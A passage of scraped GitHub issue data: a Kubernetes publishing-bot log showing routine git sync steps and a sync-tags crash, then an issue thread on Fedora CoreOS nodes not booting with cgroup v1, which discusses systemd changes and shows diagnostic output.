deads2k/client-07-listwatchtimeout' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-code-generator-master\n>\t++ sed 's/^./\\L\\u&/'\n>\t++ echo kubernetes\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=master\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=405721ab9678fde04d78961eec9498820d80408d\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-master.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-master.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch master --push-script ../push-tags-code-generator-master.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse master\n>\t+ '[' 405721ab9678fde04d78961eec9498820d80408d '!=' 405721ab9678fde04d78961eec9498820d80408d ']'\n>\t+ git checkout master\n>\tYour branch is up-to-date with 'origin/master'.\n>\tAlready on 'master'\n>[01 Dec 18 03:09 UTC]: Successfully constructed master\n>[01 Dec 18 03:09 UTC]: /publish_scripts/construct.sh code-generator release-1.10 release-1.10   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  deae5dc2b7c5d82064afd79065833e02a161eb43\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.10\n>\t+ DST_BRANCH=release-1.10\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=deae5dc2b7c5d82064afd79065833e02a161eb43\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tRunning garbage collection.\n>\tAuto packing the repository in background for optimum performance.\n>\tSee \"git help gc\" for manual housekeeping.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tAuto packing the repository in background for optimum performance.\n>\tSee \"git help gc\" for manual housekeeping.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 405721ab9678fde04d78961eec9498820d80408d\n>\t+ git branch -D release-1.10\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.10\n>\tSwitching to origin/release-1.10.\n>\t+ echo 'Switching to origin/release-1.10.'\n>\t+ git branch -f release-1.10 origin/release-1.10\n>\t+ git checkout -q release-1.10\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.10\n>\tSkipping sync because upstream/release-1.10 at deae5dc2b7c5d82064afd79065833e02a161eb43 did not change since last sync.\n>\t+ UPSTREAM_HASH=deae5dc2b7c5d82064afd79065833e02a161eb43\n>\t+ '[' deae5dc2b7c5d82064afd79065833e02a161eb43 '!=' deae5dc2b7c5d82064afd79065833e02a161eb43 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.10 at deae5dc2b7c5d82064afd79065833e02a161eb43 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.10\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.10.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.10.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.10 --push-script ../push-tags-code-generator-release-1.10.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.10\n>\t+ '[' 9de8e796a74d16d2a285165727d04c185ebca6dc '!=' 9de8e796a74d16d2a285165727d04c185ebca6dc ']'\n>\t+ git checkout release-1.10\n>\tAlready on 'release-1.10'\n>\tYour branch is up-to-date with 'origin/release-1.10'.\n>[01 Dec 18 03:09 UTC]: Successfully constructed release-1.10\n>[01 Dec 18 03:09 UTC]: /publish_scripts/construct.sh code-generator release-1.11 release-1.11   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  5933b9771b71c2d05543a0cd088542013c1446e0\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.11\n>\t+ DST_BRANCH=release-1.11\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=5933b9771b71c2d05543a0cd088542013c1446e0\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\tRunning garbage collection.\n>\t+ git gc --auto\n>\tAuto packing the repository in background for optimum performance.\n>\tSee \"git help gc\" for manual housekeeping.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tAuto packing the repository in background for optimum performance.\n>\tSee \"git help gc\" for manual housekeeping.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 9de8e796a74d16d2a285165727d04c185ebca6dc\n>\t+ git branch -D release-1.11\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.11\n>\tSwitching to origin/release-1.11.\n>\t+ echo 'Switching to origin/release-1.11.'\n>\t+ git branch -f release-1.11 origin/release-1.11\n>\t+ git checkout -q release-1.11\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ grep -w -q upstream\n>\t+ git remote\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.11\n>\t+ UPSTREAM_HASH=5933b9771b71c2d05543a0cd088542013c1446e0\n>\t+ '[' 5933b9771b71c2d05543a0cd088542013c1446e0 '!=' 5933b9771b71c2d05543a0cd088542013c1446e0 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.11 at 5933b9771b71c2d05543a0cd088542013c1446e0 did not change since last sync.'\n>\tSkipping sync because upstream/release-1.11 at 5933b9771b71c2d05543a0cd088542013c1446e0 did not change since last sync.\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.11\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.11.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.11.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.11 --push-script ../push-tags-code-generator-release-1.11.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tRemoving all local copies of origin and upstream tags.\n>\tFetching tags from remote \"upstream\".\n>\tFetching tags from remote \"origin\".\n>\t++ git rev-parse release-1.11\n>\t+ '[' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 '!=' 8c97d6ab64da020f8b151e9d3ed8af3172f5c390 ']'\n>\t+ git checkout release-1.11\n>\tAlready on 'release-1.11'\n>\tYour branch is up-to-date with 'origin/release-1.11'.\n>[01 Dec 18 03:10 UTC]: Successfully constructed release-1.11\n>[01 Dec 18 03:10 UTC]: /publish_scripts/construct.sh code-generator release-1.12 release-1.12   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=release-1.12\n>\t+ DST_BRANCH=release-1.12\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\t+ echo 'Running garbage collection.'\n>\tRunning garbage collection.\n>\t+ git gc --auto\n>\tAuto packing the repository in background for optimum performance.\n>\tSee \"git help gc\" for manual housekeeping.\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tAuto packing the repository in background for optimum performance.\n>\tSee \"git help gc\" for manual housekeeping.\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>\t+ git branch -D release-1.12\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/release-1.12\n>\tSwitching to origin/release-1.12.\n>\t+ echo 'Switching to origin/release-1.12.'\n>\t+ git branch -f release-1.12 origin/release-1.12\n>\t+ git checkout -q release-1.12\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/release-1.12\n>\t+ UPSTREAM_HASH=f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39\n>\tSkipping sync because upstream/release-1.12 at f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 did not change since last sync.\n>\t+ '[' f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 '!=' f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 ']'\n>\t+ echo 'Skipping sync because upstream/release-1.12 at f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 did not change since last sync.'\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ LAST_BRANCH=release-1.12\n>\t++ git rev-parse HEAD\n>\t+ LAST_HEAD=b1289fc74931d4b6b04bd1a259acfc88a2cb0a66\n>\t+ EXTRA_ARGS=()\n>\t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.12.sh\n>\t+ echo '#!/bin/bash'\n>\t+ chmod +x ../push-tags-code-generator-release-1.12.sh\n>\t+ '[' -z '' ']'\n>\t++ echo kubernetes\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-code-generator-release-1.12.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>\tF1201 03:10:08.377981   29045 main.go:120] Failed to get upstream branch release-1.12 first-parent list: failed to get first parent of 9df172b06a036e75a09f7145fe24ec56de119932: failed to get 2e5a3cfbc62e4a63423f43f2e6d5723806569b17: packfile not found\n>\tgoroutine 1 [running]:\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc00c0ef900, 0xc00bf2ec60, 0xfc, 0x150)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xd4\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xdc1b20, 0xc000000003, 0xc0000b4210, 0xd626de, 0x7, 0x78, 0x0)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x329\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xdc1b20, 0xc000000003, 0x9a29df, 0x36, 0xc0000f5ac8, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>\tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x9a29df, 0x36, 0xc0000f5ac8, 0x2, 0x2)\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>\tmain.main()\n>\t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:120 +0x82f\n>[01 Dec 18 03:10 UTC]: exit status 255\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=code-generator\n>    \t+ SRC_BRANCH=release-1.12\n>    \t+ DST_BRANCH=release-1.12\n>    \t+ DEPS=\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/code-generator\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=false\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ '[' '!' -f .git/info/attributes ']'\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \tAuto packing the repository in background for optimum performance.\n>    \tSee \"git help gc\" for manual housekeeping.\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \tAuto packing the repository in background for optimum performance.\n>    \tSee \"git help gc\" for manual housekeeping.\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 8c97d6ab64da020f8b151e9d3ed8af3172f5c390\n>    \t+ git branch -D release-1.12\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/release-1.12\n>    \t+ echo 'Switching to origin/release-1.12.'\n>    \t+ git branch -f release-1.12 origin/release-1.12\n>    \t+ git checkout -q release-1.12\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/release-1.12\n>    \t+ UPSTREAM_HASH=f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39\n>    \t+ '[' f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 '!=' f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 ']'\n>    \t+ echo 'Skipping sync because upstream/release-1.12 at f7a5f79d437ec07cb25a4d53cf84d3bb2297bc39 did not change since last sync.'\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ LAST_BRANCH=release-1.12\n>    \t++ git rev-parse HEAD\n>    \t+ LAST_HEAD=b1289fc74931d4b6b04bd1a259acfc88a2cb0a66\n>    \t+ EXTRA_ARGS=()\n>    \t+ PUSH_SCRIPT=../push-tags-code-generator-release-1.12.sh\n>    \t+ echo '#!/bin/bash'\n>    \t+ chmod +x ../push-tags-code-generator-release-1.12.sh\n>    \t+ '[' -z '' ']'\n>    \t++ echo kubernetes\n>    \t++ echo kubernetes\n>    \t++ sed 's/^./\\L\\u&/'\n>    \t+ /sync-tags --prefix kubernetes- --commit-message-tag Kubernetes-commit --source-remote upstream --source-branch release-1.12 --push-script ../push-tags-code-generator-release-1.12.sh --dependencies '' --mapping-output-file '../tag-code-generator-{{.Tag}}-mapping' -alsologtostderr ''\n>    \tF1201 03:10:08.377981   29045 main.go:120] Failed to get upstream branch release-1.12 first-parent list: failed to get first parent of 9df172b06a036e75a09f7145fe24ec56de119932: failed to get 2e5a3cfbc62e4a63423f43f2e6d5723806569b17: packfile not found\n>    \tgoroutine 1 [running]:\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.stacks(0xc00c0ef900, 0xc00bf2ec60, 0xfc, 0x150)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:769 +0xd4\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).output(0xdc1b20, 0xc000000003, 0xc0000b4210, 0xd626de, 0x7, 0x78, 0x0)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:720 +0x329\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.(*loggingT).printf(0xdc1b20, 0xc000000003, 0x9a29df, 0x36, 0xc0000f5ac8, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:655 +0x14b\n>    \tk8s.io/publishing-bot/vendor/github.com/golang/glog.Fatalf(0x9a29df, 0x36, 0xc0000f5ac8, 0x2, 0x2)\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/vendor/github.com/golang/glog/glog.go:1148 +0x67\n>    \tmain.main()\n>    \t\t/Users/sts/Quellen/kubernetes/src/k8s.io/publishing-bot/cmd/sync-tags/main.go:120 +0x82f\n>\n>[01 Dec 18 03:10 UTC]: exit status 255```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}]}
{"repo": "kubernetes/kubernetes", "issue_number": 134142, "issue_url": "https://github.com/kubernetes/kubernetes/issues/134142", "issue_title": "No longer testing CgroupV1 with fedora-coreos images", "issue_author": "mariafromano-25", "issue_body": "### What happened?\n\nFedora CoreOS is default booting up as CgroupV2 even though it is instructed to use CgropuV1 in yaml: `SYSTEMD_CGROUP_ENABLE_LEGACY_FORCE=1`\n\n- when running the ignition file, the template does not provision a cgroupv1 node; not sure why\n- initial investigation from: https://github.com/kubernetes/kubernetes/issues/133456#issuecomment-3287284474\n\n### What did you expect to happen?\n\nExpecting the `\"Summary API [NodeConformance] when querying /stats/summary under pressure [Feature:KubeletPSI] [Serial] should report Memory pressure in PSI metrics\"` to be skipped since it is intended for cgroupv2 and we are supposedly running a cgroupv1 node. \nThe test is running because the fedora coreos image defaults to cgroupv2.\n\n### How can we reproduce it (as minimally and precisely as possible)?\n\nRecreate the node with the same image: \nexample: \n```\ngcloud compute instances create \"debug-cgroup-node\" \\\n    --project=\"[YOUR_PROJECT_ID]\" \\\n    --zone=\"us-central1-b\" \\\n    --machine-type=\"e2-standard-4\" \\\n    --image=\"fedora-coreos-42-20250721-3-0-gcp-x86-64\" \\\n    --image-project=\"fedora-coreos-cloud\"\n```\n\nand running this command will confirm it is a cgroupv2 node: `ls /sys/fs/cgroup/cgroup.controllers`\n\n### Anything else we need to know?\n\n@kannon92 has more insights as well! \n\n### Kubernetes version\n\n<details>\n\n```console\n$ kubectl version\n# paste output here\n```\n\n</details>\n\n\n### Cloud provider\n\n<details>\n\n</details>\n\n\n### OS version\n\n<details>\n\n```console\n# On Linux:\n$ cat /etc/os-release\n# paste output here\n$ uname -a\n# paste output here\n\n# On Windows:\nC:\\> wmic os get Caption, Version, BuildNumber, OSArchitecture\n# paste output here\n```\n\n</details>\n\n\n### Install tools\n\n<details>\n\n</details>\n\n\n### Container runtime (CRI) and version (if applicable)\n\n<details>\n\n</details>\n\n\n### Related plugins (CNI, CSI, ...) and versions (if applicable)\n\n<details>\n\n</details>\n", "issue_labels": ["kind/bug", "priority/important-soon", "sig/node", "triage/accepted"], "comments": [{"author": "BenTheElder", "body": "/sig node"}, {"author": "kannon92", "body": "systemd 256 started to not boot on cgroup v1 by default.\n\nWe got around this by https://github.com/kubernetes/test-infra/pull/33796.\n\nFor some reason, systemd 257 is not obeying the same config.\n\nIt looks like there was a patch in systemd 257 to relax this restriction: https://github.com/systemd/systemd/pull/34999.\n\nFCOS is using fedora 42 which is using systemd 257.\n\nIn systemd 258, the systemd community says that they will remove cgroup v1 entirely.\n\nTBH I don't think there is much interest in fixing this. We have one systemd release it seems to support cgroup v1 before that support is removed.\n\nsystemd v258 removals: https://lwn.net/Articles/1001657/\n\n> The complete removal of support for cgroup v1 ('legacy' and 'hybrid'\nhierarchies) is scheduled for v258.\n"}, {"author": "rphillips", "body": "+1 on not testing cgroupv1 on Fedora images."}, {"author": "kannon92", "body": "@dims has mentioned setting `fail-cgroupv1` on kubelet.\n\nI think we need a follow up KEP and start moving cgroupv1 support to not supported and remove the testing lanes.\n\nI don't really like having piecemeal approach to this where we stop testing cgroupv1 for fedora but the k8s community is still \"supporting\" cgroupv1."}, {"author": "kannon92", "body": "Reading that systemd 257 patch, I think we may need to just add an explict kernel argument to boot on cgroup v1.\n\n> Require both systemd.unified_cgroup_hierarchy=0 and SYSTEMD_CGROUP_ENABLE_LEGACY_FORCE=1. */"}, {"author": "mariafromano-25", "body": "@SergeyKanzhelev "}, {"author": "kannon92", "body": "And systemd 258 is out..\n\nhttps://github.com/systemd/systemd/releases/tag/v258\n\nLooks like cgroupv1 support was removed from systemd 258."}, {"author": "kannon92", "body": "/triage accepted\n/priority important-soon"}, {"author": "SergeyKanzhelev", "body": "> I think we need a follow up KEP and start moving cgroupv1 support to not supported and remove the testing lanes.\n\nThat was the idea. We can start isolating cgroupv1 tests and mark test lanes with cgroupv1 as \"special\". We are already in maintenance only mode and need to be prepared to remove those completely"}, {"author": "kannon92", "body": "We applied a fix to boot cgroup v1 nodes for fcos.\n\nLooks like we are hitting failures on these cgroup v1 nodes.\n\nhttps://prow.k8s.io/view/gs/kubernetes-ci-logs/logs/ci-crio-cgroupv1-node-e2e-conformance/1970536084844580864\n\nLooks like cgroup v1 is failing a cpuset check:\n\n```\nValidating cgroups...\nCGROUPS_CPU: enabled\nCGROUPS_CPUACCT: enabled\nCGROUPS_CPUSET: \u001b[0;31mmissing\n```\n\ncc @pacoxu \n\n"}, {"author": "kannon92", "body": "cc @haircommander \n\nWe are correctly starting a cgroup v1 node but looks to be failing systemd validator because cpuset can\u2019t be found for cgroup v1."}, {"author": "saschagrunert", "body": "Confirmed that the `cpuset` controller is not available on our Fedora Coreos images:\n\n```\nroot@sgrunert:~# cat /proc/cgroups\n#subsys_name    hierarchy       num_cgroups     enabled\ncpu     3       38      1\ncpuacct 3       38      1\nblkio   6       1       1\nmemory  5       107     1\ndevices 11      38      1\nfreezer 4       1       1\nnet_cls 7       1       1\nperf_event      13      1       1\nnet_prio        7       1       1\nhugetlb 8       1       1\npids    12      43      1\nrdma    10      1       1\nmisc    2       1       1\ndmem    9       1       1\n```\n\n```\nroot@sgrunert:~# cat /etc/os-release\nNAME=\"Fedora Linux\"\nVERSION=\"42.20250901.3.0 (CoreOS)\"\nRELEASE_TYPE=stable\nID=fedora\nVERSION_ID=42\nVERSION_CODENAME=\"\"\nPLATFORM_ID=\"platform:f42\"\nPRETTY_NAME=\"Fedora CoreOS 42.20250901.3.0\"\nANSI_COLOR=\"0;38;2;60;110;180\"\nLOGO=fedora-logo-icon\nCPE_NAME=\"cpe:/o:fedoraproject:fedora:42\"\nHOME_URL=\"https://getfedora.org/coreos/\"\nDOCUMENTATION_URL=\"https://docs.fedoraproject.org/en-US/fedora-coreos/\"\nSUPPORT_URL=\"https://github.com/coreos/fedora-coreos-tracker/\"\nBUG_REPORT_URL=\"https://github.com/coreos/fedora-coreos-tracker/\"\nREDHAT_BUGZILLA_PRODUCT=\"Fedora\"\nREDHAT_BUGZILLA_PRODUCT_VERSION=42\nREDHAT_SUPPORT_PRODUCT=\"Fedora\"\nREDHAT_SUPPORT_PRODUCT_VERSION=42\nSUPPORT_END=2026-05-13\nVARIANT=\"CoreOS\"\nVARIANT_ID=coreos\nOSTREE_VERSION='42.20250901.3.0'\n```\n\n```\nroot@sgrunert:~# uname -a\nLinux sgrunert.europe-west1-b.c.openshift-gce-devel.internal 6.15.10-200.fc42.x86_64 #1 SMP PREEMPT_DYNAMIC Fri Aug 15 15:57:06 UTC 2025 x86_64 GNU/Linux\n```\n\nSetting 